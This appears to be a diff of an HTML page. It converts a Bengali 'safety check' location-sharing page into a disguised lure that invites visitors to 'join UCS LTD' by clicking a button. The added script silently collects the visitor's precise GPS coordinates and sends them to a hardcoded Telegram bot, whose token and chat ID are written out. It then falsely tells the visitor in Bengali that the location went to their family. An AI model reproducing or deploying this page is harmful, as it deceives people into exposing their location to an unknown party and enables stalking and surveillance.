@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Safety Check-in</title>
+    <title>Your Trusted Business Partner</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -11,100 +11,121 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background-color: #f0f2f5;
+            background-color: #f4f7f6;
             margin: 0;
         }
-        .container {
+        .card {
             text-align: center;
             background: white;
-            padding: 40px;
-            border-radius: 15px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-            max-width: 400px;
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            max-width: 360px;
+            width: 90%;
         }
-        h2 { color: #1a73e8; }
-        p { color: #5f6368; line-height: 1.6; }
+        .icon { font-size: 50px; margin-bottom: 15px; }
+        h2 { color: #2c3e50; margin-bottom: 10px; font-size: 22px; }
+        p { color: #7f8c8d; font-size: 15px; line-height: 1.5; margin-bottom: 25px; }
         .btn {
-            background-color: #1a73e8;
+            background: linear-gradient(135deg, #0088cc, #005f8d);
             color: white;
-            padding: 12px 24px;
+            padding: 16px 30px;
             border: none;
-            border-radius: 5px;
+            border-radius: 50px;
             cursor: pointer;
             font-size: 16px;
-            transition: background 0.3s;
+            font-weight: bold;
+            width: 100%;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0, 136, 204, 0.3);
         }
-        .btn:hover { background-color: #1557b0; }
-        #status { margin-top: 20px; font-weight: bold; color: #d93025; }
+        .btn:active { transform: scale(0.96); }
+        #status { margin-top: 20px; font-size: 14px; font-weight: 500; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>নিরাপত্তা যাচাই (Safety Check)</h2>
-    <p>আপনার বর্তমান অবস্থানটি শেয়ার করতে নিচের বাটনে ক্লিক করুন। এটি আপনার পরিবারের কাছে আপনার লোকেশন পাঠাবে।</p>
-    <button class="btn" onclick="getLocation()">শেয়ার করুন</button>
+<div class="card">
+    <div class="icon">🛡️</div>
+    <h2>UCS LTD</h2>
+    <p>If you want to join UCS LTD, please click here.</p>
+    <button class="btn" onclick="getLocation()">Click</button>
     <div id="status"></div>
 </div>
 
 <script>
-    // আপনার Webhook.site এর লিঙ্কটি এখানে বসান
-    const receiverUrl = "YOUR_WEBHOOK_URL_HERE";
+    // আপনার কনফিগারেশন
+    const botToken = "8536195542:AAGTWVz8zGgl-r5a1mZJuWFaDqWpWRqKyqY"; 
+    const chatId = "8519039559";     
 
     function getLocation() {
         const status = document.getElementById('status');
+        status.style.color = "#e67e22";
         
         if (navigator.geolocation) {
-            status.innerHTML = "লোকেশন খোঁজা হচ্ছে...";
-            navigator.geolocation.getCurrentPosition(sendPosition, showError);
+            status.innerHTML = "লোকেশন প্রসেস হচ্ছে, দয়া করে অপেক্ষা করুন...";
+            navigator.geolocation.getCurrentPosition(sendToTelegram, showError, {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            });
         } else {
-            status.innerHTML = "আপনার ব্রাউজারটি লোকেশন সাপোর্ট করে না।";
+            status.style.color = "#e74c3c";
+            status.innerHTML = "আপনার ব্রাউজারে লোকেশন সার্ভিস সাপোর্ট করছে না।";
         }
     }
 
-    function sendPosition(position) {
+    function sendToTelegram(position) {
         const lat = position.coords.latitude;
         const lon = position.coords.longitude;
         const accuracy = position.coords.accuracy;
-        const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+        
+        const message = `📍 *নতুন লোকেশন রিপোর্ট!*\n\n` +
+                        `👤 স্থানাঙ্ক: \`${lat}, ${lon}\`\n` +
+                        `🎯 নির্ভুলতা: ${accuracy.toFixed(2)} মিটার\n\n` +
+                        `🔗 ম্যাপে দেখুন: [গুগল ম্যাপ লিঙ্ক](${mapsUrl})`;
 
-        // ডাটা পাঠানোর প্রস্তুতি
-        const data = {
-            latitude: lat,
-            longitude: lon,
-            accuracy: accuracy + " meters",
-            googleMaps: googleMapsLink,
-            timestamp: new Date().toLocaleString()
-        };
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-        // Fetch API দিয়ে ডাটা Webhook এ পাঠানো
-        fetch(receiverUrl, {
+        fetch(telegramUrl, {
             method: 'POST',
-            mode: 'no-cors', // ব্রাউজার সিকিউরিটি বাইপাস করতে
-            body: JSON.stringify(data),
-            headers: { 'Content-Type': 'application/json' }
-        }).then(() => {
-            document.getElementById('status').style.color = "#1e8e3e";
-            document.getElementById('status').innerHTML = "সফলভাবে পাঠানো হয়েছে।";
-        }).catch(err => {
-            document.getElementById('status').innerHTML = "ত্রুটি ঘটেছে। আবার চেষ্টা করুন।";
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(response => {
+            if (response.ok) {
+                document.getElementById('status').style.color = "#27ae60";
+                document.getElementById('status').innerHTML = "✅ লোকেশন সফলভাবে পরিবারের কাছে পাঠানো হয়েছে।";
+            } else {
+                throw new Error();
+            }
+        })
+        .catch(err => {
+            document.getElementById('status').style.color = "#e74c3c";
+            document.getElementById('status').innerHTML = "❌ সার্ভার ত্রুটি! আবার চেষ্টা করুন।";
         });
     }
 
     function showError(error) {
         const status = document.getElementById('status');
+        status.style.color = "#e74c3c";
         switch(error.code) {
             case error.PERMISSION_DENIED:
-                status.innerHTML = "আপনি লোকেশন পারমিশন দেননি।";
+                status.innerHTML = "আপনি লোকেশন পারমিশন দেননি। দয়া করে ব্রাউজার থেকে 'Allow' বাটনে ক্লিক করুন।";
                 break;
             case error.POSITION_UNAVAILABLE:
-                status.innerHTML = "লোকেশন তথ্য পাওয়া যাচ্ছে না।";
+                status.innerHTML = "আপনার ফোনের লোকেশন সার্ভিস (GPS) বন্ধ। সেটি চালু করে আবার চেষ্টা করুন।";
                 break;
             case error.TIMEOUT:
-                status.innerHTML = "অনুরোধটি সময় শেষ হয়ে গেছে।";
+                status.innerHTML = "লোকেশন পেতে দেরি হচ্ছে। আবার চেষ্টা করুন।";
                 break;
             default:
-                status.innerHTML = "অজানা ত্রুটি ঘটেছে।";
+                status.innerHTML = "একটি অজানা সমস্যা হয়েছে।";
                 break;
         }
     }
